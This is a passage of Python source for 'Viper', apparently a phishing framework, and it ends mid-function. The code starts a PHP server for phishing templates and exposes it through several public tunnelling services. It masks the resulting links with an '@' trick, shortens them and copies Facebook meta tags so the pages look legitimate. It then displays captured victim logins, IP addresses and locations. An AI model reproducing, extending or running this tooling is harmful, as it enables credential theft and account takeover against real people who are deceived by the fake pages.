#!/bin/python/
import contextlib
import ipaddress
import json
import os
import pickle
import socket
import random
import re
import hashlib
import sys
from collections import defaultdict
if os.name != 'nt':
    import readline
import subprocess
import time
import urllib.request
import requests
from bs4 import BeautifulSoup
from shutil import get_terminal_size
from maillib import Email
import multiprocessing as mp
from functools import partial


columns = get_terminal_size().columns

cprint = None
if 'nt' not in os.name:
    from rich.panel import Panel
    from rich.console import Console
    cprint = Console().print

    os.system('stty -echoctl')


red = "\033[91m"
bold_red = "\033[1;91m"
green = "\033[92m"
yellow = "\033[93m"
magenta = "\033[95m"
blue = "\033[94m"
cyan = "\033[96m"
white = "\033[97m"
bold_green = "\033[1;92m"
bold_yellow = "\033[1;93m"
bold_magenta = "\033[1;95m"
bold_blue = "\033[1;94m"
bold_cyan = "\033[1;96m"
bold_white = "\033[1;97m"
no_clr = "\033[00;00m"
nc = "\033[00m"

error = f"{bold_yellow}[{bold_white}!{bold_yellow}] {red}"
success = f"{bold_magenta}[{bold_white}√{bold_magenta}] {bold_blue}"
info = f"{bold_cyan}[{bold_white}•{bold_cyan}] {bold_magenta}"
uninfo = f"{bold_yellow}[{bold_white}-{bold_yellow}] {yellow}"
ask = f"{bold_magenta}[{bold_white}?{bold_magenta}] {bold_blue}"


# Setup variables
if 'nt' not in os.name:
    home = os.getenv("HOME")
else:
    home = os.getcwd().replace('\\Viper', '')
    home = home.replace('\\', '/')
config_file = f"{home}/Viper/config.json"
default_site_dir = f"{home}/Viper/default_site/"
site_dir = f"{home}/.site"
ssh_dir = f"{home}/.ssh"
tunneler_dir = f"{home}/Viper/.tunnelers"
php_file = f"{tunneler_dir}/php.log"
cf_file = f"{tunneler_dir}/cf.log"
lx_file = f"{tunneler_dir}/lx.log"
lhr_file = f"{tunneler_dir}/lhr.log"
svo_file = f"{tunneler_dir}/svo.log"
cf_command = f"{tunneler_dir}/cloudflared"
lx_command = f"{tunneler_dir}/loclx"

php_log=f"{php_file}"
cf_log=f"{cf_file}"
lx_log=f"{lx_file}"
lhr_log=f"{lhr_file}"
svo_log=f"{svo_file}"

lx_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://localxpose.io
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://localxpose.io/dashboard/access{yellow} and copy your authtoken
"""

class WordListReader:
    def __init__(self, filepath):
        self.filepath = filepath
        self.data = self._parse_file()

    def _parse_file(self):
        data = defaultdict(list)
        current_key = None
        with open(self.filepath, 'r') as file:
            for line in file:
                line = line.strip()
                if line.startswith('@'):
                    # Extract the network name
                    current_key = re.findall(r'@(\w+):\s*(\w+)', line)[0]
                    data[current_key[1]] = []
                elif line.startswith('-'):
                    # Add the value directly following the dash
                    if current_key:
                        value = line[1:].strip()  # Remove the leading dash
                        data[current_key[1]].append(value)
                elif line and current_key:
                    # Any non-empty line following a dash is a password
                    data[current_key[1]].append(line)
        return data

    def getpasswords(self):
        """Returns all passwords."""
        passwords = []
        for values in self.data.values():
            passwords.extend(values)
        return passwords

    def getpatterns(self):
        """Returns network names and their passwords in dictionary form."""
        patterns = {key: value for key, value in self.data.items()}
        return patterns

    def getvalues(self):
        """Returns the current stored data as key-value pairs."""
        return self.data

    def getvalue(self, networkname):
        """Gets the value (passwords) for a specific networkname."""
        return self.data.get(networkname, [])

    def store_parameter(self, parameter, new_values):
        """Store a new parameter with associated values."""
        if isinstance(new_values, dict):
            for key, values in new_values.items():
                self.data[key] = values

    def append(self, parameter, new_values):
        """Append new values to an existing networkname."""
        if parameter in self.data:
            self.data[parameter].extend(new_values)
        else:
            self.data[parameter] = new_values

    def store_value(self, new_value):
        """Stores a new value to an unnamed parameter."""
        self.data['unnamed'].append(new_value)


with open("config.json", 'r') as _config_file:
    _data = _config_file.read()
    _contents = json.loads(_data)
    sshkey = _contents['ssh_key']
    lxp_tkn = _contents['loclx']
    latest_news = _contents['daily_news']
    version = _contents['version']
    template = _contents['template']
    redirect = _contents['redirect']
    port = int(_contents['port'])
    site_move = _contents['site_move']
    mask = _contents['mask']
    lx_url = _contents['lx-url']
    lhr_url = _contents['lhr-url']
    svo_url = _contents['svo-url']
    cf_url = _contents['cf-url']
    dailyNews = _contents['dailyNews']
    tempMail = _contents['tempMail']
    tunneling_service = _contents['tunneling_service']
    _config_file.close()
    local_url = f"127.0.0.1:{port}"

e = None

if 'nt' not in os.name:
    def disable_history():
        readline.clear_history()
        readline.set_history_length(0)
else:
    def disable_history():
        pass

def get_content(left, right, file):
    with open(file, 'r') as data_file:
        data = data_file.read()
        data_file.close()
    try:
        return data.split(left)[-1].split(right)[0].strip()
    except ValueError:
        return ''
# Disable command history

disable_history()

# Your script logic goes here
def strip_ansi_codes(text):
    ansi_escape = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
    return ansi_escape.sub('', text)
def print_panel(title, news_content, border_color='\033[00m', title_color='', text_color='', left=False):
    """
    Print a styled panel with the latest news using ANSI escape codes for title and text.

    Args:
        title (str): The title to display.
        news_content (str): The news content to display.
        border_color (str): The color code for the border (default is no color).
        title_color (str): The color code for the title (default is no color).
        text_color (str): The color code for the text (default is no color).
    """
    # Split news into lines
    RESET = "\033[0m"
    news_lines = news_content.splitlines()

    # Strip ANSI codes from the title for length calculation purposes
    stripped_title = strip_ansi_codes(title)

    # Find the maximum length for the title and content
    max_title_length = len(stripped_title)
    max_news_length = max(len(line) for line in news_lines) if news_lines else 0

    # Determine the total width of the panel
    total_length = max(max_title_length, max_news_length) + 4  # 4 for borders and spaces

    # Create the top border line with title
    title_with_borders = f"─{title}─"
    stripped_title_with_borders = f"─{stripped_title}─"

    # Adjust the length to ensure the border is uniform
    remaining_length = total_length - len(stripped_title_with_borders)
    left_border_length = remaining_length // 2
    right_border_length = remaining_length - left_border_length

    # Print the top border with the title included, applying border and title color
    print(f"{border_color}╭{'─' * left_border_length}{title_color}{title_with_borders}{border_color}{'─' * right_border_length}╮{RESET}")  # Top border

    # Print the news content centered with vertical borders, applying text color
    for line in news_lines:
        if not left:
            print(f"{border_color}│ {text_color}{line.center(total_length - 2)}{border_color} │{RESET}")  # Center each line
        else:
            # Add padding to make sure each line has the same length for the panel's width
            left_aligned_line = line.ljust(total_length - 4)
            print(f"{border_color}│ {text_color}{left_aligned_line}{border_color} │{RESET}")  # Left-align each line

    # Print the bottom border with corners, applying border color
    print(f"{border_color}╰{'─' * (total_length )}╯{RESET}")  # Bottom border
def update():
    global php_old_content, sshkey, lxp_tkn, latest_news, version, template, redirect, port, local_url, site_move, mask, lx_url, lhr_url, svo_url, cf_url, tunneling_service, dailyNews, tempMail
    with open("config.json", 'r') as _config_file:
        _data = _config_file.read()
        _contents = json.loads(_data)
        sshkey = _contents['ssh_key']
        lxp_tkn = _contents['loclx']
        latest_news = _contents['daily_news']
        version = _contents['version']
        template = _contents['template']
        redirect = _contents['redirect']
        port = int(_contents['port'])
        site_move = _contents['site_move']
        mask = _contents['mask']
        lx_url = _contents['lx-url']
        lhr_url = _contents['lhr-url']
        svo_url = _contents['svo-url']
        cf_url = _contents['cf-url']
        dailyNews = _contents['dailyNews']
        tempMail = _contents['tempMail']
        tunneling_service = _contents['tunneling_service']
        local_url = f"127.0.0.1:{port}"
        _config_file.close()
    _php_cont_file = open('.tunnelers/php.log', 'r')
    new_content = _php_cont_file.read().splitlines()[-1]
    _php_cont_file.close()
    try:
        if php_old_content != new_content:
            print(f"\n{bold_yellow}{new_content}\n")
            php_old_content = new_content
        else:
            pass
    except NameError:
        php_old_content = new_content

    if tunneling_service == "True" or tunneling_service:
        cf = get_content("|  https://", ".trycloudflare.com", f"{cf_log}")
        lx = get_content("", "", f"{lx_log}")
        lhr = get_content("with tls termination, https://", ".lhr.life", f"{lhr_log}")
        svo = get_content("HTTP traffic from https://", ".serveo.net", f"{svo_log}")
        if cf_url is None and cf != "" and " " not in cf and len(cf) > 1:
            cf_url = cf
            print(f"\n{info.replace('•', 'INFO').replace(']', ']:')}CloudFlare URL Found: {cyan} https://{cf_url}.trycloudflare.com")
            replace_json('cf-url', "https://" + cf_url + ".trycloudflare.com")
        if lx_url is None and lx != "" and " " not in lx and len(lx) > 1:
            lx_url = lx
            print(f"\n{info.replace('•', 'INFO').replace(']', ']:')}Local-xpose URL Found: {cyan} https://{lx_url}.loclx.io")
            replace_json('lx-url', "https://" + lx_url + ".loclx.io")
        if lhr_url is None and lhr != "" and " " not in lhr and len(lhr) > 1:
            lhr_url = lhr
            print(f"\n{info.replace('•', 'INFO').replace(']', ']:')}LocalHostRun URL Found: {cyan} https://{lhr_url}.lhr.life")
            replace_json('lhr-url', "https://" + lhr_url + ".lhr.life")
        if svo_url is None and svo != "" and " " not in svo and len(svo) > 1:
            svo_url = svo
            print(f"\n{info.replace('•', 'INFO').replace(']', ']:')}Serveo URL Found: {cyan} https://{svo_url}.serveo.net")
            replace_json('svo-url', "https://" + svo_url + ".serveo.net")
def replace_json(token, new_value, file_path=config_file):
    # Read the JSON file
    with open(file_path, 'r') as file:
        data = json.load(file)

    # Replace the token with the new value
    if token in data:
        data[token] = new_value
    else:
        print(f"Token '{token}' not found in the JSON.")

    # Write the updated JSON back to the file
    with open(file_path, 'w') as file:
        json.dump(data, file, indent=2)
def center_text(text):
    lines = text.splitlines()
    if len(lines) > 1:
        minlen = min([len(line) for line in lines if len(line)!=0]) + 8
        new_text = ""
        for line in lines:
            padding = columns + len(line) - minlen
            if columns % 2 == 0 and padding % 2 == 0:
                padding += 1
            new_text += line.center(padding) + "\n"
        return new_text
    else:
        return text.center(columns+8)
def get_news():
    try:
        data = requests.get('https://raw.githubusercontent.com/mabdullahprogrammer/Viper/main/config.json')
    except Exception:
        return latest_news

    content = json.loads(data.text)
    replace_json('daily_news', content['daily_news'])
    return content['daily_news']
# Context manager to suppress stdout and stderr
@contextlib.contextmanager
def suppress_output():
    with open(os.devnull, 'w') as devnull:
        old_stdout = sys.stdout
        old_stderr = sys.stderr
        sys.stdout = devnull
        sys.stderr = devnull
        try:
            yield
        finally:
            sys.stdout = old_stdout
            sys.stderr = old_stderr
def banner(news=True):
    if sshkey == "True":
        ssh_stat = f'{bold_green}Configured!'
    else:
        ssh_stat = f'{bold_red}Not Configured! {green}"type ssh-setup to configure"'

    if lxp_tkn == "False":
        lx_stat = f'{blue}Free Account Mode'
    elif lxp_tkn == "True":
        lx_stat = f'{bold_green}Configured!'
    else:
        lx_stat = f'{bold_red}Not Configured! {green}"type loclx-setup to configure"'

    print(rf"""
{red}__     ___                 
{cyan}\ \   / (_)_ __   ___ _ __ 
{yellow} \ \ / /| | '_ \ / _ \ '__|    {bold_white} | {bold_cyan}SSH Status  : {ssh_stat}
{blue}  \ V / | | |_) |  __/ |       {bold_white} | {bold_cyan}Loclx Stats : {lx_stat}
{red}   \_/  |_| .__/ \___|_|    
{magenta}          |_|    
{yellow}{" "*28}         [{blue}v{version[:2]}{yellow}]
{cyan}{" "*29}[{blue}By {green}"""+f"""\x4D\x2E\x20\x41\x62\x64\x75\x6C\x6C\x61\x68{cyan}]""")
    if dailyNews is None or dailyNews:
        if news:
            print('\rPlease Wait...', end='', flush=True)
            lt_news = get_news()
            print(f'\r{" "*15}', end='\n', flush=True)
        else:
            lt_news = latest_news
        if 'nt' not in os.name:
            info_prmpt = '([bold white]"set dailyNews=False" to hide news[yellow])'
            cprint(
                Panel(
                    center_text(lt_news),
                    title=f"[purple]Latest Viper News [yellow] {info_prmpt if dailyNews is None else ''}[/]",
                    title_align="center",
                    border_style="bold white",
                    style='blue'
                )
            )
        else:
            info_prmpt = f'({bold_white}"set dailyNews=False" to hide news{yellow})'
            print_panel(
                title=f'{magenta}Latest Viper News{info_prmpt if dailyNews is None else ""}{bold_white}'+'─'*((columns-(65)) if dailyNews is not None else columns-65),
                border_color=f'{bold_white}',
                text_color=f"{blue}",
                news_content=lt_news
            )
    else:
        print(f'{yellow}Skipping news')

def clear():
    if os.name != 'nt':
        os.system('clear')
    else:
        os.system('cls')

if os.name != 'nt':
    def bgtask(command, out, working_directory=f'{home}/Viper'):
        os.chdir(working_directory)
        os.system(f'(eval {command} > {out} 2>&1) &')
else:
    def bgtask(command, out, working_directory=f'{home}/Viper'):
        os.chdir(working_directory)
        os.system(f'start /B cmd /c "{command} > {out} 2>&1"')

def url_manager(url, tunneler, mask):
    if 'nt' not in os.name:
        urlinfo = f"""
        [bold purple]URL         : [bold yellow]{url}    
        [bold purple]Masked URL  : [bold yellow]https://{mask}{url.replace('https://', '@')} 
        """
        text = ""
        lines = urlinfo.splitlines()
        for line in lines:
            text += f"[bold cyan][[/][white]*[/][bold cyan]]{line}[/]\n"
        cprint(
            Panel(
                text.strip(),
                title=f"[bold green]{tunneler}[/]",
                title_align="left",
                border_style="bold white",
            )
        )
    else:
        urlinfo = f"""
                URL         : {url}    
                Masked URL  : https://{mask}{url.replace('https://', '@')} 
                """
        text = ""
        lines = urlinfo.splitlines()
        for line in lines:
            text += f"[*] {line}\n"

        print_panel(news_content=text.strip(),
                    title=f'{bold_green}{tunneler}{bold_white}',
                    text_color=f'{yellow}',
                    border_color=f'{bold_white}')
def show_file_data(file, data=''):
    if not data or len(data) < 2:
        with open(file, "r") as filedata:
            lines = filedata.read().splitlines()
    else:
        lines = str(data).splitlines()
    text = ""
    if 'nt' not in os.name:
        for line in lines:
            text += f"[cyan][[/][white]*[/][cyan]][/][yellow] {line}[/]\n"
        cprint(
            Panel(
                text.strip(),
                title=f"[bold white]Viper[/][cyan] Data[/]",
                title_align="left",
                border_style="bold red",
            )
        )
    else:
        for line in lines:
            text += f"[*] {line}\n"
        print_panel(news_content=text.strip(), title=f'{bold_white}Viper {cyan}Data{bold_red}', border_color=f'{bold_red}')
def replace_data(old, new, file):
    try:
        old_file = open(file, 'r')
        old_data = old_file.read()
        new_data = old_data.replace(old, new)
        old_file.close()
        new_file = open(file, 'w')
        new_file.write(new_data)
        new_file.close()
        return True
    except FileExistsError or FileNotFoundError:
        return False
def get_creds(terminal=False):
    if os.path.isfile(f'{home}/.site/info.txt'):
        _victim_info = True
    else:
        _victim_info = False
    if os.path.isfile(f'{home}/.site/location.txt'):
        _victim_location = True
    else:
        _victim_location = False
    if os.path.isfile(f'{home}/.site/usernames.txt'):
        _victim_login = True
    else:
        _victim_login = False
    if os.path.isfile(f'{home}/.site/ip.txt'):
        _victim_ip = True
    else:
        _victim_ip = False
    if terminal:
        if _victim_info:
            print(f"{success}Victim's Info Found!")
            show_file_data(f'{home}/.site/info.txt')
        else:
            print(f"{uninfo}Victim's Info Not Found!")
        if _victim_location:
            print(f"{success}Victim's Location Found!")
            show_file_data(f'{home}/.site/location.txt')
        else:
            print(f"{uninfo}Victim's Location Not Found!")
        if _victim_login:
            print(f"{success}Victim's Login Info Found!")
            show_file_data(f'{home}/.site/usernames.txt')
        else:
            print(f"{uninfo}Victim's Login info Not Found!")
        if _victim_ip:
            print(f"{success}Victim's IP info Found!")
            show_file_data(f'{home}/.site/ip.txt')
        else:
            print(f"{uninfo}Victim's IP Info Not Found!")
        print(f"{info}Any Location/Audio/Image file would be saveed under {home}/Media")
    else:
        return _victim_info, _victim_login, _victim_location, _victim_ip
def lookup(address: str):
    if address.startswith('http'):
        resp = requests.get(address)
        if int(resp.status_code) == 404:
            print(error+f"The URL Provided was not found | {white} 404.")
            return
        address = address.replace('https://', '').replace('http://', '')
        ip = socket.gethostbyname(address)
    else:
        if address.count('.') == 3:
            ip = address
        else:
            print(error + f"Invalid IP syntax | {yellow} i.e {white}{ipaddress.IPv4Address.exploded} .")
            return

    url = f'https://ipwhois.app/json/{ip}'
    response = urllib.request.urlopen(url)
    ipwhois = json.load(response)
    if 'nt' in os.name:
        ip_info = f'[●] Address Name:{white} {socket.gethostbyname(ip)}\n'
        for key, value in ipwhois.items():
            ip_info += f"[●]{key}: {value}\n"

        print_panel(title=f'{bold_white}Viper {cyan}Data{bold_red}', border_color=f'{bold_red}', text_color=f"{white}",
                    news_content=ip_info.strip())
    else:
        ip_info = f'[blue][[/][white]●[/][blue]][/][yellow] Address Name:{white} {socket.gethostbyname(ip)}[/]\n'
        for key, value in ipwhois.items():
            ip_info += f"[blue][[/][white]●[/][blue]][/][yellow] [green]{key}: [white]{value}[/]\n"

        cprint(
            Panel(
                ip_info.strip(),
                title=f"[bold white]Viper[/][cyan] Data[/]",
                title_align="left",
                border_style="bold red",

            )
        )
def site_manager(site_path:str):
    if site_path.count('/') < 3 and 'default' not in site_path:
        print(f"{error}Invalid Template Path! Cant Process further please change your template path or chose default.")
        return False
    elif site_path.count('/') > 3 and not site_path.endswith('/') and not site_path.startswith('/') and "default" not in site_path:
        print(f"{error}Invalid Template Path! Cant Process further please change your template path or chose default.")
        return False

    site_path = site_path.replace('templates', '.templates')
    try:
        if 'default' in site_path:
            open(f'{home}/Viper/default_site/index.php', 'r')
            site_path = "default_site/"
        else:
            if site_path.endswith('/'):
                open(f'{home}/Viper/{site_path}index.php', 'r')
            else:
                open(f'{home}/Viper/{site_path}/index.php', 'r')
    except FileExistsError or FileNotFoundError:
        print(f'{error}File/System Error, Cant proceed!')
        print(f'{info}{yellow}This error may be caused because of change in viper files'
              f'              or viper.py has been move somewhere else. To check whats the problem'
              f'              type problem-scan and fix it using the corresponding command '
              f'              in the output of problem-scan command.')
        return False

    os.system(f'rm -r {home}/.site')
    os.system(f'cp -r {home}/Viper/{site_path} {home}/.site')
    replace_json('site_move', True)
    print(f"{success}Site Parameters Updated")
    return True
def list_templates(path='/templates', indent=' [yellow]> [purple]', max_depth=1, current_depth=0, output=''):
    path = path.replace('list', '').replace(' ', '')
    if not path.startswith('/'):
        path = "/"+path
    template_path = path
    if path in ['/templates/', 'templates/']:
        path = '/.templates/'
    path = path.replace('/templates', '.templates')
    path = path.replace('/.', '.')
    if (not os.path.exists(path) or '.' in template_path) and 'template' not in template_path:
        print(f'{error}Invalid template chosen! {magenta}type "list -all" to get list of all templates.')
        return False
    for item in os.listdir(path):
        item_path = os.path.join(path, item)
        if os.path.isdir(item_path):
            item_path = item_path.replace('.', '/')
            output += f"{indent} {item_path}\n"
            output = output.replace('//', '/.')
            if current_depth < max_depth and path.count('/') <= 0:
                if os.name == 'nt':
                    output = list_templates(item_path, '         |--> ', max_depth, current_depth + 1,
                                            output)
                else:
                    output = list_templates(item_path,  '         [yellow]|--> [purple]', max_depth, current_depth + 1, output)

    if current_depth < max_depth:
        text = ""
        lines = output.splitlines()
        if os.name ==' nt':
            for line in lines:
                text += f"[*] {line}\n"
            print_panel(title=f'{bold_white}Viper {cyan}Data{bold_red}', border_color=f'{bold_red}', news_content=text.strip())
        else:
            for line in lines:
                text += f"[cyan][[/][white]*[/][cyan]][/][yellow] {line}[/]\n"
            cprint(
                Panel(
                    text.strip(),
                    title=f"[bold white]Viper[/][cyan] Data[/]",
                    title_align="left",
                    border_style="bold red",
                )
            )
    return output
def select_template(path:str):
    global template
    path = path.replace('select template', '').replace(' ', '')
    if not path.startswith('/'):
        path = "/"+path
    if not path.endswith('/'):
        path = path+"/"
    path = path.replace('/template', '/.template')
    if path.count('/') > 4 or 'templates' not in path and 'default' not in path:
        print(f"{uninfo}Please Chose a valid template!")
    if 'default' in path:
        path = "default_site/"
    try:
        if "default" in path:
            open(f'{home}/Viper/{path}index.php', 'r') # just added to return error if not in the directory
            template = path
            replace_json('template', template)
            print(f"{success}selected template => {white}'default_site'{nc}")
            return True
        else:
            if path.endswith('/'):
                open(f'{home}/Viper{path}index.php', 'r') # just added to return error if not in the directory
            else:
                open(f'{home}/Viper{path}/index.php', 'r') # just added to return error if not in the directory
            path = path.replace('/.templates', 'templates')
            template = path
            replace_json('template', template)
            print(f"{success}selected template => {white}'{template}'{nc}")
            return True
    except FileNotFoundError:
        print(f'{error}Please select a valid template. to check templates write list-all')
        template = 'default_site/'
        replace_json('template', template)
        return False
def show_options():
    if os.name == "nt":
        output = f"""
                     Name              Selected Option
                    --------         --------------------
                    Version       ||   {version}
                                  ||
                    Template      ||   {template}
                                  ||
                    Port          ||   {port}
                                  ||
                    Redirect URL  ||   {redirect}
                                  ||
                    Mask          ||   {mask}
            """
        print(output)
    else:
        output = f"""
            [bold green]  Name  [bold red]       [bold green]  Selected Option
            --------       --------------------
            [bold yellow]Version  [bold red]    ||[bold purple]     {version}
            
            [bold yellow]Template[bold red]     ||[bold purple]     {template}
            
            [bold yellow]Port    [bold red]     ||[bold purple]     {port}
            
            [bold yellow]Redirect URL[bold red] ||[bold purple]     {redirect}
            
            [bold yellow]Mask        [bold red] ||[bold purple]     {mask}
    """
        text = ""

        cprint(
            Panel(
                output,
                title=f"[bold white]Viper[/][cyan] Data[/]",
                title_align="left",
                border_style="bold red",
            )
        )
def ssh_key():
    try:
        if not os.path.isfile(f"{ssh_dir}/id_rsa"):
            print(f"{info}Generating IDRSA")
            is_no_pass = subprocess.run(f"ssh-keygen -y -P '' -f {ssh_dir}/id_rsa", shell=True)
            if is_no_pass.returncode != 0:
                pass
                # delete(ssh_dir)
            print(f"{nc}")
            os.system(f"mkdir -p {ssh_dir} && ssh-keygen -N '' -t rsa -f {ssh_dir}/id_rsa")
        print(f"{info}Generating SSH Keys...")
        is_known = subprocess.run("ssh-keygen -F localhost.run", stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, cwd=ssh_dir, shell=True)
        if is_known.returncode != 0:
            os.system(f"ssh-keyscan -H localhost.run >> {ssh_dir}/known_hosts")

        is_known2 = subprocess.run("ssh-keygen -F serveo.net", stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, cwd=ssh_dir, shell=True)
        if is_known2.returncode != 0:
            os.system(f"ssh-keyscan -H serveo.net >> {ssh_dir}/known_hosts")
        replace_json("ssh_key", 'True')
    except Exception as e:
        print(f"{error}SSH configuration failed due to: {e}")
        replace_json("ssh_key", 'False')
def lx_token():
    global lx_command
    while True:
        status = subprocess.run(f"{lx_command} account status", shell=True, capture_output=True)
        status = status.stdout.decode("utf-8").strip().lower()
        if not "error" in status:
            print(f"{info}Your Loclx account is updated!")
            replace_json('loclx', 'True')
            break

        has_token = input(f"\n{ask}Do you have loclx access token? [y/N/help]: {white}")
        if has_token == "y":
            os.system(f"{lx_command} account login")
            replace_json('loclx', 'True')
            break
        elif has_token == "help":
            print(lx_help)
        elif has_token.lower().startswith('n'):
            replace_json('loclx', 'False')
            break
        else:
            print(f"\n{error}Invalid input '{has_token}'!")
def php_server():
    if port == 4445:
        print(f"\n{uninfo}Port not configured using default port.")

    print(f"\n{info}Initializing PHP Server....")
    bgtask(f'php -S {local_url}', php_log, f'{home}/.site')
    os.chdir(f'{home}/Viper/')
    time.sleep(5)
    with open(php_log, 'r') as file:
        if "Failed" in file.read():
            reason = get_content("(reason:", ")", php_log)
            if "Permission denied" in reason:
                file.close()
                print(f"\n{error}Access denied on this port! Please reconfigure the port. ")
                return False
            else:
                file.close()
                print(f"\n{error}Another Process on same port still running, please reconfigure port.")
                return False
        else:
            file.close()
    print(f"\n{success}{green}PHP Server has Started Successfully!")
    return True
def shorten(shortener, url):
    url = url.replace('shrtn', '').replace(' ', '')
    if shortener == "tiny-url":
        website = "https://tinyurl.com/api-create.php?url=" + url.strip()
        try:
            res = requests.get(website).text
        except Exception as e:
            print(f"{error}{e}")
            res = ""
        shortened = res.split("\n")[0] if "\n" in res else res
        if "http://" not in shortened and "https://" not in shortened:
            shortened = "Not Found"
        result = shortened
    elif shortener == "shrtco":
        website = "https://api.shrtco.de/v2/shorten?url=" + url.strip()
        try:
            res = requests.get(website).text
            json_resp = json.loads(res)
        except Exception as e:
            result = "Not Found"
            json_resp = ""
        if json_resp != "":
            if json_resp["ok"]:
                result = json_resp["result"]["full_short_link"]

    elif shortener == "is-gd":
        website = "https://is.gd/create.php?format=simple&url=" + url.strip()
        try:
            res = requests.get(website).text
        except Exception as e:
            print(f"{error}{e}")
            res = ""
        shortened = res.split("\n")[0] if "\n" in res else res
        if "https://" not in shortened:
            shortened = "Not Found"
        result = shortened
    else:
        result = "NOT FOUND"
    result = f"[bold purple]  Shortened URL: [bold yellow] {result}"
    cprint(
        Panel(
            result,
            title=f"[bold white]Shortened URL[/]",
            title_align="left",
            border_style="bold blue",
        )
    )
def close_tunnels():
    if tunneling_service:
        killer()
        replace_json('tunneling_service', False)
        os.system('pkill ssh')
        os.system('pkill php')
    else:
        return False
def tunneler():
    global cf_url, lx_url, lhr_url, svo_url
    print(f"\n{info}Initializing Tunnelling Services...")

    bgtask(f"{cf_command} tunnel -url {local_url}", cf_log)
    time.sleep(1)
    bgtask(f"{lx_command} tunnel --raw-mode http --https-redirect -t {local_url}", lx_log)
    time.sleep(1)
    bgtask(f"ssh -R 80:{local_url} serveo.net -T -n", svo_log)
    time.sleep(1)
    bgtask(f"ssh -R 80:{local_url} localhost.run -T -n", lhr_log)
    time.sleep(5)
    cf_url = get_content("|  https://", ".trycloudflare.com", f"{cf_log}")
    lx_url = get_content("", "", f"{lx_log}")
    lhr_url = get_content("with tls termination, https://", ".lhr.life", f"{lhr_log}")
    svo_url = get_content("HTTP traffic from https://", ".serveo.net", f"{svo_log}")
    cf_url = "" if " " in cf_url else cf_url
    lx_url = "" if " " in lx_url else lx_url
    svo_url = "" if " " in svo_url else svo_url
    lhr_url = "" if " " in lhr_url else lhr_url
    if cf_url == "" and lx_url == "" and lhr_url == "" and svo_url == "":
        print(f"\n{error}Tunneling Failed!")
        return False


    if cf_url == "" or not cf_url.endswith('.trycloudflare.com'):
        print(f"\n{error}Tunneling not available for Cloud Flare")
    else:
        replace_json('cf-url', "https://" + cf_url + ".trycloudflare.com")

    if lhr_url == "" or " " in lhr_url or len(lhr_url) < 5:
        print(f"\n{error}Tunneling not available for LocalHostRun")
    else:
        replace_json('lhr-url', "https://" + lhr_url + ".lhr.life")

    if lx_url == "" or not lx_url.endswith('.loclx.io'):
        print(f"\n{error}Tunneling not available for Local-xpose")
    else:
        replace_json('lx-url', "https://" + lx_url + ".loclx.io")

    if svo_url == "" or not svo_url.endswith('.serveo.net'):
        print(f"\n{error}Tunneling not available for Serveo")
    else:
        replace_json('svo-url', "https://" + svo_url + ".serveo.net")

    print(f"{success}{green}Tunnelers started successfully!")
    return True
def killer():
    print(f"{info}Killing Process", end='')
    try:
        if os.name == 'nt':
            os.system(
                'powershell "Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -match \'ssh\' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }"')
        else:
            os.system('pkill -f ssh')
        print(f"{bold_green}.", end='')
    except Exception:
        print(f"{bold_red}.", end='')
    try:
        if os.name == 'nt':
            os.system(
                'powershell "Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -match \'php\' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }"')

        else:
            os.system('pkill -f php')
        print(f"{bold_green}.", end='')
    except Exception:
        print(f"{bold_red}.", end='')
    try:
        replace_json('svo-url', None)
        print(f"{bold_green}.", end='')
    except Exception:
        print(f"{bold_red}.", end='')
    try:
        replace_json('lhr-url', None)
        print(f"{bold_green}.", end='')
    except Exception:
        print(f"{bold_red}.", end='')
    try:
        replace_json('lx-url', None)
        print(f"{bold_green}.", end='')
    except Exception:
        print(f"{bold_red}.", end='')
    try:
        replace_json('cf-url', None)
        print(f"{bold_green}.", end='')
    except Exception:
        print(f"{bold_red}.", end='')
    try:
        replace_json('site_move', True)
        print(f"{bold_green}.", end='')
    except Exception:
        print(f"{bold_red}.", end='')
    try:
        replace_json('tunneling_service', False)
        print(f"{bold_green}.", end='')
    except Exception:
        print(f"{bold_red}.", end='')
    if tempMail:
        try:
            with suppress_output():
                execute('mailbox off')
            replace_json('tempMail', False)
        except:
            print(f"{bold_red}.", end='')
        else:
            print(f"{bold_green}.", end='')
    for _url_files in os.listdir('.templates'):
        if _url_files in ['php.log', 'svo.log', 'cf.log', 'lhr.log', 'lx.log']:
            try:
                os.remove(_url_files)
            except:
                print(f"{bold_red}.", end='')
            else:
                print(f"{bold_green}.", end='')
    print(f"Done!")
def get_meta(url):
    # Facebook requires some additional header
    headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
    }
    if "facebook" in url:
        headers.update({
            "upgrade-insecure-requests": "1",
            "dnt": "1",
            "content-type": "application/x-www-form-url-encoded",
            "origin": "https://m.facebook.com",
            "referer": "https://m.facebook.com/",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-user": "empty",
            "sec-fetch-dest": "document",
            "sec-ch-ua-platform": "Android",
            "accept-encoding": "gzip, deflate br"
        })
    allmeta = ""
    try:
        response = requests.get(url, headers=headers).text
        soup = BeautifulSoup(response, "html.parser")
        metas = soup.find_all("meta")
        if metas is not None and metas!=[]:
            allmeta = "\n".join([str(meta) for meta in metas])
    except Exception as e:
        print(f"{error}Failed to get meta due to: {e}")
    return allmeta
def set_meta(url):
    url = url.replace('set meta', '').replace(' ', '')
    if not url.startswith('http'):
        print(f'{error}Invalid URL')
        return False
    if url=="":
        print(f'{error}No Meta URL is specified! No meta would be configured')
    else:
        allmeta = get_meta(url)
        if allmeta=="":
            print(f"\n{error}No meta found from specified URL!")
        with open(f'{site_dir}/meta.php', 'w') as mt_file:
            mt_file.write(allmeta)
            mt_file.close()
        return
def set_redirect(redirect_url:str):
    redir_word = "redirectUrl"
    if template.startswith('templates/login/'):
        file_word = "login"
